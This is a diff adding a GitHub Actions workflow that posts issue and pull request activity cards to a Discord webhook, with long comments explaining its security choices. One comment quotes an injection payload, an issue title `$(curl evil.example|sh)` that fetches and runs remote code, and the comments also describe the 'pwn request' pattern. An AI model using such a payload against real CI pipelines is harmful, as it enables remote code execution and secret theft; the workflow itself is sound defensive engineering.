@@ -1,0 +1,558 @@
+name: 'Discord: issue and PR activity'
+
+# ---------------------------------------------------------------------------
+# Why this workflow exists (and what it deliberately does NOT do)
+#
+# - Posts one card per issue or pull request event to #github, the same
+#   channel that carries push summaries. The repository is public, so a
+#   stranger reads this channel. They must see an issue and think "I could
+#   take that one". The `good first issue` and `help wanted` cards are the
+#   whole point, and the colour grammar exists so they stand out beside the
+#   push traffic they now sit next to.
+# - It deliberately does NOT page anyone. Production paging is Telegram:
+#   Grafana, deploy failure, and the runner watchdog. Discord carries release
+#   notes, push summaries, and now this channel. `scripts/ci/notify-telegram.sh`
+#   is a Telegram transport, not a shared notifier, so it is not reused here.
+# - It deliberately does NOT check out any code, and it must never start to.
+#   That single fact is what makes `pull_request_target` safe below. Add
+#   `actions/checkout` with the pull request head and this file becomes a pwn
+#   request. Fork code would then run with the base repository's secrets.
+# - It deliberately does NOT use the `pull_request` trigger. A run started by
+#   a fork receives no repository secrets. `DISCORD_GITHUB_WEBHOOK` would
+#   then be empty for the outside contributors this channel exists to show.
+# - It deliberately does NOT send `"flags": 4`. That value is SUPPRESS_EMBEDS,
+#   documented as "do not include any embeds when serializing this message".
+#   The sibling at .github/workflows/discord-activity.yml:218 sets it
+#   correctly, because that message carries its links in `content`. This file
+#   puts everything in an embed, so 4 would post a blank message. The only
+#   flag used here is 4096, SUPPRESS_NOTIFICATIONS, and only on quiet states.
+# - It deliberately does NOT subscribe to every action type. The `issues`
+#   event has 20 of them. An unfiltered feed would bury the recruitment cards
+#   this channel exists to carry. So `labeled` posts for two label names only.
+# - It SHARES `DISCORD_GITHUB_WEBHOOK` with .github/workflows/discord-activity.yml,
+#   because both write to #github. The naming convention is one secret per
+#   channel, DISCORD_<CHANNEL>_WEBHOOK, so a secret name always says where its
+#   posts land. Releases keep their own channel and their own
+#   `DISCORD_RELEASES_WEBHOOK`.
+# - It deliberately does NOT post to a Discord FORUM channel. That option was
+#   dropped. A webhook can create a forum post and reply into one, but it can
+#   never apply a tag afterwards and can never archive a post, because both
+#   need MANAGE_THREADS on `PATCH /channels/{channel.id}`. That is a bot
+#   token, a much larger credential than a webhook URL. Revisit only if a
+#   self-tidying forum is worth owning one.
+# - It deliberately does NOT carry a `concurrency:` block. That breaks a house
+#   convention on purpose. An earlier draft grouped runs per item with
+#   `cancel-in-progress: false`. GitHub documents that it holds at most one
+#   pending run per group, and that a new run evicts that pending one whatever
+#   the flag says. So a third event would delete the second card. One open plus
+#   two triage labels is the normal path here, so the block lost the very card
+#   it claimed to protect. This rests on the published workflow-syntax
+#   reference, not on a local run. Run order was never guaranteed either, so
+#   the block was decoration.
+# - Failure posture is split on purpose, and the split is not free. An empty
+#   secret warns and exits 0, matching
+#   .github/workflows/discord-activity.yml:195-198. This feed is
+#   informational. A red check on a newcomer's first pull request is the
+#   opposite of the goal. The cost is real. The secret is always available on
+#   these two triggers, so an empty value means a misconfigured repository,
+#   and the channel then stays silently dead. That is why this file does not
+#   copy the hard `exit 1` at .github/workflows/discord-release.yml:156-159.
+#   A Discord-side rejection is different, and it does fail loudly.
+# - Known residual, so nobody reports it as new. Anyone with a GitHub account
+#   can re-fire an event and post another card. No trigger list stops that,
+#   because the useful events are the re-fireable ones. The two cheapest loops
+#   are closed here: an unmerged pull request close posts nothing, and a merge
+#   happens once. The remedy for the rest is to block the account, or to
+#   rotate the webhook.
+# ---------------------------------------------------------------------------
+
+on:
+  issues:
+    types: [opened, reopened, labeled, closed]
+  # `pull_request_target` runs in the base repository context, so it can read
+  # the webhook secret on a fork pull request. See the block above. This job
+  # never checks out or runs repository code, and that is what makes it safe.
+  #
+  # Three types, and they do not map to three kinds of card. A draft posts at
+  # `ready_for_review`, not at `opened`, because a draft is not asking for
+  # eyes yet. A `closed` pull request posts only when it merged, so a closed
+  # unmerged one produces no card at all. That is deliberate. This channel
+  # shows work landing, not work rejected.
+  pull_request_target:
+    types: [opened, ready_for_review, closed]
+
+jobs:
+  notify:
+    # House precedent from .github/workflows/discord-activity.yml:19. It is
+    # necessary but not sufficient here. `github.actor` is whoever acted, so
+    # on `closed` it names the maintainer, not the bot that opened the item.
+    # The build step therefore also tests the AUTHOR. Dependabot opens up to
+    # ten pull requests a month against this repository.
+    if: github.actor != 'dependabot[bot]'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    # This job reads the event payload and calls curl. It touches no GitHub
+    # API, so the token needs no scope. An omitted block would inherit the
+    # repository default, which may be write. On `pull_request_target` that
+    # matters, so the empty map is load-bearing, not decoration.
+    permissions: {}
+
+    steps:
+      # ----------------------------------------------------------------------
+      # Build the card.
+      #
+      # Every value is read out of EVENT_JSON with jq. No `${{ }}` expression
+      # appears inside this script. The runner substitutes an expression while
+      # it GENERATES the shell file. An issue titled `$(curl evil.example|sh)`
+      # would then run, not print. The repository is public, so any account
+      # can write that title.
+      #
+      # Every optional read carries `// empty` or a default. A key missing
+      # from a payload then drops its part of the card, instead of rendering
+      # the text `null`.
+      #
+      # The card is one embed: a coloured bar, a title link, and one metadata
+      # line. There is no body excerpt, on purpose. The body is the only field
+      # that carries nested markdown, unclosed code fences, tables and masked
+      # links. It is also the only one large enough to threaten Discord's 6000
+      # character total. Dropping it deletes that whole class of hazard rather
+      # than filtering it. The title link is one click from the full text.
+      # ----------------------------------------------------------------------
+      - name: Build the card
+        id: build
+        env:
+          EVENT_JSON: ${{ toJSON(github.event) }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          set -euo pipefail
+
+          ACTION=$(jq -r '.action // ""' <<< "$EVENT_JSON")
+          NUMBER=$(jq -r '.issue.number // .pull_request.number // empty' <<< "$EVENT_JSON")
+          RAW_TITLE=$(jq -r '.issue.title // .pull_request.title // empty' <<< "$EVENT_JSON")
+          ITEM_URL=$(jq -r '.issue.html_url // .pull_request.html_url // empty' <<< "$EVENT_JSON")
+          ITEM_STATE=$(jq -r '.issue.state // .pull_request.state // ""' <<< "$EVENT_JSON")
+          LOGIN=$(jq -r '.issue.user.login // .pull_request.user.login // ""' <<< "$EVENT_JSON")
+          AUTHOR_TYPE=$(jq -r '.issue.user.type // .pull_request.user.type // ""' <<< "$EVENT_JSON")
+          ASSOC=$(jq -r '.issue.author_association // .pull_request.author_association // ""' <<< "$EVENT_JSON")
+          REASON=$(jq -r '.issue.state_reason // ""' <<< "$EVENT_JSON")
+          MERGED=$(jq -r '.pull_request.merged // false' <<< "$EVENT_JSON")
+          DRAFT=$(jq -r '.pull_request.draft // false' <<< "$EVENT_JSON")
+          LABEL_ADDED=$(jq -r '.label.name // ""' <<< "$EVENT_JSON")
+          HOLDERS=$(jq -r '(.issue.assignees // .pull_request.assignees // []) | length' <<< "$EVENT_JSON")
+          ADDS=$(jq -r '.pull_request.additions // 0' <<< "$EVENT_JSON")
+          DELS=$(jq -r '.pull_request.deletions // 0' <<< "$EVENT_JSON")
+          FILES=$(jq -r '.pull_request.changed_files // 0' <<< "$EVENT_JSON")
+
+          CLAIMABLE=$(jq -r '
+            [ (.issue.labels // .pull_request.labels // [])[].name | ascii_downcase ]
+            | any(. == "good first issue" or . == "help wanted")
+          ' <<< "$EVENT_JSON")
+
+          # Label chips. Each name loses control characters and backticks, so
+          # one stray backtick cannot break every chip after it. `clean` is
+          # explained at the SUBJECT strip below. Each name is then capped at
+          # 30 with a visible ellipsis, because a silent cut names a label that
+          # does not exist. Capping each NAME, and not the joined string, means
+          # a cut can never land inside a backtick pair.
+          # The two recruitment labels sort to the front, because they are the
+          # only ones a reader acts on. Three chips show, and the rest become
+          # `+N`.
+          CHIPS=$(jq -r '
+            def clean:
+              explode
+              | map(if . < 32 or . == 127
+                       or (. >= 8234 and . <= 8238) or (. >= 8294 and . <= 8297)
+                    then 32 else . end)
+              | implode;
+            [ (.issue.labels // .pull_request.labels // [])[].name
+              | clean
+              | gsub("`"; "")
+              | gsub("\\s+"; " ")
+              | gsub("^\\s+|\\s+$"; "")
+              | select(length > 0)
+              | if length > 30 then .[0:29] + "…" else . end
+            ] as $names
+            | ( $names | map(select(ascii_downcase == "good first issue" or ascii_downcase == "help wanted")) ) as $claim
+            | ( $names | map(select(ascii_downcase != "good first issue" and ascii_downcase != "help wanted")) ) as $rest
+            | ( $claim + $rest ) as $sorted
+            | ( $sorted | length ) as $n
+            | if $n == 0 then ""
+              else ( $sorted[0:3] | map("`" + . + "`") | join(" ") )
+                   + ( if $n > 3 then " +" + (($n - 3) | tostring) else "" end )
+              end
+          ' <<< "$EVENT_JSON")
+
+          # Both issue templates set a title prefix.
+          # `.github/ISSUE_TEMPLATE/bug_report.md` sets `title: '[Bug]: '` with
+          # `labels: ['bug']`. `.github/ISSUE_TEMPLATE/feature_request.md` sets
+          # `title: '[Feature]: '` with `labels: ['enhancement']`. The prefix
+          # repeats the chip, and it eats the first characters a reader scans.
+          # So it is stripped when its matching label is present.
+          #
+          # ISSUES ONLY. `.github/PULL_REQUEST_TEMPLATE.md` sets no title. A
+          # pull request titled `[Feature]: ...` was typed by a person who
+          # meant it, and stripping it there would delete an author's own words.
+          PREFIX=""
+          if [ "$EVENT_NAME" = "issues" ]; then
+            PREFIX=$(jq -r '
+              [ (.issue.labels // [])[].name | ascii_downcase ] as $names
+              | if ($names | any(. == "bug")) then "[Bug]:"
+                elif ($names | any(. == "enhancement")) then "[Feature]:"
+                else "" end
+            ' <<< "$EVENT_JSON")
+          fi
+
+          POST=true
+          GLYPH=""
+          STATE=""
+          COLOR=null
+          BANNER=""
+          QUIET=1
+
+          # The claim words have one source, so the metadata line and the
+          # banner can never contradict each other. An earlier draft hard-coded
+          # "Up for grabs" in the line while the banner read the assignee
+          # count. A held issue then said both things on one card.
+          if [ "$HOLDERS" -gt 0 ]; then
+            CLAIM_STATE="Wanted"
+            CLAIM_BANNER="🟡 **Wanted** · someone already holds this one"
+          else
+            CLAIM_STATE="Up for grabs"
+            CLAIM_BANNER="🟡 **Up for grabs** · nobody has claimed this yet"
+          fi
+
+          # Filter on the AUTHOR, not the actor. `type` comes from the GitHub
+          # simple-user schema. The `[bot]` login suffix is the backstop for an
+          # integration that acts under a personal token and reports `User`.
+          case "$AUTHOR_TYPE" in
+            Bot) POST=false ;;
+          esac
+          case "$LOGIN" in
+            *'[bot]') POST=false ;;
+          esac
+
+          if [ -z "$NUMBER" ] || [ -z "$ITEM_URL" ]; then
+            echo "::warning::the payload carries no item number or URL; skip post"
+            POST=false
+          fi
+
+          # Colour is base-10, with the hex kept in this comment, following
+          # .github/workflows/discord-release.yml:98-108.
+          # Verified: $((16#0ea5e9)) == 959977 ; $((16#f59e0b)) == 16096779 ;
+          #           $((16#8b5cf6)) == 9133302 ; $((16#22c55e)) == 2278750.
+          # The palette is four bars, plus one absent bar. A terminal state
+          # sends no colour key, so the missing bar is a signal of its own.
+          # Sky and violet look alike to a colour-blind reader. That is why the
+          # state word sits at the head of the metadata line. The word carries
+          # the meaning, and the bar only speeds it up.
+          if [ "$POST" = "true" ] && [ "$EVENT_NAME" = "issues" ]; then
+            case "$ACTION" in
+              opened)
+                # Sky, always, even when a claim label is already on the issue.
+                # A label applied at creation fires its own `labeled` event a
+                # second later, and that event owns the amber card. Amber here
+                # would post the same recruitment card twice. The chip still
+                # names the label on this card.
+                GLYPH="📥"; STATE="Issue opened"; COLOR=959977
+                ;;
+              reopened)
+                # A reopen fires no `labeled` event. So this is the one action
+                # that has to read the labels itself to find a claim.
+                GLYPH="🔁"; STATE="Issue reopened"; COLOR=959977
+                if [ "$CLAIMABLE" = "true" ]; then COLOR=16096779; fi
+                ;;
+              labeled)
+                # The firehose gate. Only the two labels a contributor acts on
+                # reach the channel. Every other label posts nothing.
+                #
+                # The open test is not decoration. GitHub lets a maintainer
+                # label a closed issue. Without the test, this channel recruits
+                # a stranger for work that is already finished.
+                CLAIM_LABEL=$(printf '%s' "$LABEL_ADDED" | tr '[:upper:]' '[:lower:]')
+                if { [ "$CLAIM_LABEL" = "good first issue" ] || [ "$CLAIM_LABEL" = "help wanted" ]; } \
+                   && [ "$ITEM_STATE" = "open" ]; then
+                  GLYPH="🙋"; STATE="$CLAIM_STATE"; COLOR=16096779
+                else
+                  POST=false
+                fi
+                ;;
+              closed)
+                GLYPH="📕"; COLOR=null
+                case "$REASON" in
+                  not_planned) STATE="Closed, not planned" ;;
+                  duplicate)   STATE="Closed as duplicate" ;;
+                  *)           STATE="Closed" ;;
+                esac
+                ;;
+              *) POST=false ;;
+            esac
+          elif [ "$POST" = "true" ]; then
+            # Amber never reaches this half, and that is the fix for a real
+            # defect. A pull request is written work, so a claim label on it is
+            # a reviewer request, not an invitation. An earlier draft ran the
+            # amber override across both halves, and a MERGED pull request then
+            # posted "Up for grabs" over a green tick.
+            case "$ACTION" in
+              opened)
+                # A draft is not asking for eyes yet. It posts at
+                # `ready_for_review` instead, which is the real request.
+                if [ "$DRAFT" = "true" ]; then
+                  POST=false
+                else
+                  GLYPH="🔀"; STATE="PR opened"; COLOR=9133302
+                fi
+                ;;
+              ready_for_review)
+                GLYPH="🔀"; STATE="PR ready for review"; COLOR=9133302
+                ;;
+              closed)
+                # There is no `merged` action on this event. A merge is
+                # `closed` plus `merged == true`. A file that misses this
+                # reports every merge as a plain close.
+                if [ "$MERGED" = "true" ]; then
+                  GLYPH="✅"; STATE="PR merged"; COLOR=2278750
+                else
+                  POST=false
+                fi
+                ;;
+              *) POST=false ;;
+            esac
+          fi
+
+          # Stop before building anything. Most runs of this workflow end here:
+          # an ordinary label, a draft, a bot author, or an unmerged close.
+          # Leaving a half-built card on disk would be work nobody reads. It
+          # would also trap anyone who later drops the gate on the post step.
+          if [ "$POST" != "true" ]; then
+            echo "post=false" >> "$GITHUB_OUTPUT"
+            echo "nothing to post for ${EVENT_NAME}/${ACTION}"
+            exit 0
+          fi
+
+          # `author_association` reads CONTRIBUTOR for every human pull request
+          # this repository has received. So the test must be "not on the
+          # team", and not "first ever". The token is a welcome signal, not a
+          # fact.
+          OUTSIDER=false
+          case "$ASSOC" in
+            OWNER|MEMBER|COLLABORATOR) ;;
+            *) OUTSIDER=true ;;
+          esac
+
+          # `content` renders above the embed at full text size. It is the
+          # loudest pixel Discord gives us, so it is spent on one state only.
+          # It holds no URL, so Discord adds no link preview under it, and no
+          # suppression flag is needed.
+          #
+          # Amber is set in two places, and both are in the `issues` half. So
+          # this block is unreachable on a pull request run. Do not move it
+          # into that branch to "simplify" it.
+          if [ "$COLOR" = "16096779" ]; then
+            BANNER="$CLAIM_BANNER"
+          fi
+
+          # The phone buzzes only when a person outside the team is waiting, or
+          # when work lands. Everything else carries 4096, which suppresses the
+          # push notification while still posting the message.
+          if [ "$COLOR" != "null" ]; then
+            if [ "$COLOR" = "16096779" ] || [ "$COLOR" = "2278750" ] || [ "$OUTSIDER" = "true" ]; then
+              QUIET=0
+            fi
+          fi
+
+          # `](` becomes `] (`. Discord's link parser only fires when `]` is
+          # immediately followed by `(`. That rule is recorded at
+          # .github/workflows/discord-activity.yml:36-40. One space defeats a
+          # masked link and loses no text. An embed title is not a markdown
+          # surface, but the guard costs nothing and does not rest on that.
+          #
+          # `clean` is the same strip as the regex class at
+          # .github/workflows/discord-activity.yml:158, written as decimal
+          # codepoints. Same behaviour, safer bytes. A backslash-u escape in a
+          # YAML block scalar survives git, but not every round trip. Two
+          # reviewers of this file received a copy where that escape had become
+          # a raw NUL byte, and a raw NUL makes the workflow unparseable.
+          # Decimal codepoints cannot decay that way.
+          #
+          # 0 to 31 and 127 are the C0 controls plus DEL, which is the house
+          # line exactly. 8234 to 8238 is U+202A-U+202E, and 8294 to 8297 is
+          # U+2066-U+2069. Those are the bidi overrides. They reverse the
+          # display order of the text after them, which is a cheap deception in
+          # a card title. The broader Cc-plus-Cf property form was measured,
+          # then rejected. It also strips U+200C and U+200D, which Persian text
+          # and joined emoji both need.
+          SUBJECT=$(jq -rn --arg raw "$RAW_TITLE" --arg prefix "$PREFIX" '
+            def clean:
+              explode
+              | map(if . < 32 or . == 127
+                       or (. >= 8234 and . <= 8238) or (. >= 8294 and . <= 8297)
+                    then 32 else . end)
+              | implode;
+            $raw
+            | clean
+            | gsub("\\s+"; " ")
+            | gsub("^\\s+|\\s+$"; "")
+            | ( if $prefix != "" and (ascii_downcase | startswith($prefix | ascii_downcase))
+                then .[($prefix | length):]
+                else . end )
+            | gsub("^\\s+"; "")
+            | gsub("\\]\\("; "] (")
+          ')
+
+          # Cap the COMPOSED string, never the raw title. The glyph and the
+          # number can otherwise push the result past the cut. 100 is well under
+          # the Discord limit of 256 for `title`. A longer bold line wraps to
+          # four rows on a phone, and it buries the metadata line.
+          TITLE=$(jq -rn --arg glyph "$GLYPH" --arg num "$NUMBER" --arg subject "$SUBJECT" '
+            ( $glyph + " #" + $num + " " + $subject )
+            | if length <= 100 then .
+              else
+                ( .[0:99] ) as $cut
+                | ( $cut | rindex(" ") ) as $space
+                | ( if $space != null and $space > 60 then $cut[0:$space] else $cut end ) + "…"
+              end
+          ')
+
+          # The diff stat prints only when the payload reports a changed file.
+          # A card reading "+0 -0" would be a lie. This is also the strongest
+          # recruitment fact the channel can carry, because it proves that a
+          # small change gets merged here.
+          DIFF=""
+          if [ "$FILES" -gt 0 ]; then
+            if [ "$FILES" -eq 1 ]; then
+              DIFF="+${ADDS} -${DELS} in 1 file"
+            else
+              DIFF="+${ADDS} -${DELS} in ${FILES} files"
+            fi
+          fi
+
+          # One metadata line, never prose. The state is named in words at its
+          # head, so a colour-blind reader and a client with a broken emoji
+          # font both keep the meaning. A terminal card carries the state word
+          # alone. Card height then becomes a signal too. The field holds the
+          # item's author, and beside "Closed" that would read as "this person
+          # closed it".
+          #
+          # The 200 cap drops a whole segment, and it never cuts one. An
+          # earlier draft cut the joined string, and a card then read
+          # "in 21 files" for 217 changed files.
+          if [ "$COLOR" = "null" ]; then
+            DESC="$STATE"
+          else
+            DESC=$(jq -rn \
+              --arg state "$STATE" \
+              --arg chips "$CHIPS" \
+              --arg login "$LOGIN" \
+              --arg outsider "$OUTSIDER" \
+              --arg diff "$DIFF" '
+              [ $state,
+                ( $chips | select(. != "") ),
+                ( $login | select(. != "") ),
+                ( if $outsider == "true" then "outside contributor" else empty end ),
+                ( $diff | select(. != "") )
+              ]
+              | reduce .[] as $part ("";
+                  if . == "" then $part
+                  elif ((. + " · " + $part) | length) <= 200 then . + " · " + $part
+                  else . end)
+            ')
+          fi
+
+          # The payload is built entirely with `jq -n` plus --arg and
+          # --argjson. That is the idiom at
+          # .github/workflows/discord-release.yml:172-200, so every
+          # user-controlled field is JSON-escaped at the boundary. Building
+          # this by string interpolation would break on any title that holds a
+          # quote, a backslash or a newline.
+          #
+          # `allowed_mentions.parse` is an empty array. A webhook parses user
+          # mentions by default. Without this line a raw `<@ID>` written by a
+          # stranger would ping a real person, and that default has already
+          # moved once. Budget: title 100, description 200, content 48. The
+          # Discord total across one message is 6000.
+          jq -n \
+            --arg title "$TITLE" \
+            --arg url "$ITEM_URL" \
+            --arg desc "$DESC" \
+            --arg banner "$BANNER" \
+            --argjson color "$COLOR" \
+            --argjson quiet "$QUIET" '
+            {
+              allowed_mentions: { parse: [] },
+              embeds: [
+                { title: ($title | .[0:256]), url: $url, description: ($desc | .[0:4096]) }
+                + ( if $color == null then {} else { color: $color } end )
+              ]
+            }
+            + ( if $banner == "" then {} else { content: ($banner | .[0:2000]) } end )
+            + ( if $quiet == 1 then { flags: 4096 } else {} end )
+          ' > "$RUNNER_TEMP/discord-payload.json"
+
+          # Only a scalar this workflow computed crosses the step boundary. The
+          # card itself goes through a file. That is the shape at
+          # .github/workflows/discord-release.yml:125. An issue title is
+          # arbitrary text. A heredoc delimiter inside it would escape into the
+          # environment of every later step.
+          echo "post=$POST" >> "$GITHUB_OUTPUT"
+
+      # ----------------------------------------------------------------------
+      # Post the card.
+      #
+      # `?wait=true` makes Discord validate the payload and answer 200 with the
+      # created message. Without it Discord answers 204 even when it silently
+      # drops the message, and a status check would then pass on a lost post.
+      #
+      # The webhook lives in this step's env only. So the parsing step above
+      # cannot read it, even if a bug there mishandles input.
+      # ----------------------------------------------------------------------
+      - name: Post the card to Discord
+        if: steps.build.outputs.post == 'true'
+        env:
+          WEBHOOK: ${{ secrets.DISCORD_GITHUB_WEBHOOK }}
+        run: |
+          set -euo pipefail
+
+          if [ -z "${WEBHOOK:-}" ]; then
+            echo "::warning::DISCORD_GITHUB_WEBHOOK is empty; skip post"
+            exit 0
+          fi
+
+          PAYLOAD_FILE="$RUNNER_TEMP/discord-payload.json"
+          RESPONSE_FILE="$RUNNER_TEMP/discord-response.json"
+
+          post_once() {
+            local code
+            code=$(curl -sS -o "$RESPONSE_FILE" -w '%{http_code}' \
+              -X POST \
+              -H 'Content-Type: application/json' \
+              --data-binary "@$PAYLOAD_FILE" \
+              "${WEBHOOK}?wait=true") || code="000"
+            printf '%s' "$code"
+          }
+
+          HTTP_STATUS=$(post_once)
+
+          # Discord publishes no per-webhook rate number, so read the answer
+          # instead of guessing one. `retry_after` is SECONDS, and it is a
+          # float. A triage day can open twenty issues in under a minute. Each
+          # one is its own run. One retry turns the common burst collision into
+          # a posted card, not a red workflow.
+          if [ "$HTTP_STATUS" = "429" ]; then
+            RETRY=$(jq -r '.retry_after // 5' "$RESPONSE_FILE" 2>/dev/null || printf '5')
+            RETRY=$(awk -v r="$RETRY" 'BEGIN { if (r + 0 <= 0 || r + 0 > 30) r = 5; printf "%.3f", r + 0 }')
+            echo "::warning::Discord rate limited the post; retrying once in ${RETRY}s"
+            sleep "$RETRY"
+            HTTP_STATUS=$(post_once)
+          fi
+
+          echo "Discord HTTP status: $HTTP_STATUS"
+
+          # A Discord-side rejection fails loudly, instead of silently dropping
+          # the card. That covers a 404 dead webhook, a 400 bad embed, and a
+          # second 429. It matches
+          # .github/workflows/discord-release.yml:205-216.
+          if [ "$HTTP_STATUS" -lt 200 ] || [ "$HTTP_STATUS" -ge 300 ]; then
+            echo "::error::Discord webhook rejected the card (HTTP $HTTP_STATUS)"
+            cat "$RESPONSE_FILE"
+            exit 1
+          fi
